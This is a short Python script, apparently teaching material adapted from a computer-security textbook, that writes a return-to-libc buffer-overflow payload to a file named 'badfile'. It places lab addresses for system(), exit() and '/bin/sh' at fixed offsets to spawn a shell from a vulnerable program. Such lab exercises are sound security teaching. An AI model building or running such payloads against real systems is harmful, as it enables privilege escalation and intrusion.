#!/usr/bin/python3
# Dr. Fanping Zeng, Nov. 1, 2022. libc_exploit.py
# Modified from Wenliang Du's book (Computer Security, 2020). page 104.

import sys

# 给content填上非零值
content = bytearray(0x90 for i in range(300))

a3 = 0xbfff1234     # "/bin/sh"的地址
content[120:124] = (a3).to_bytes(4, byteorder='little')

a2 = 0xb7e32345     # exit()函数的地址
content[116:120] = (a2).to_bytes(4, byteorder='little')

a1 = 0xb7e43456     # system()函数的地址
content[112:116] = (a1).to_bytes(4, byteorder='little')

# 把content存入badfile
file = open("badfile", "wb")
file.write(content)
file.close()
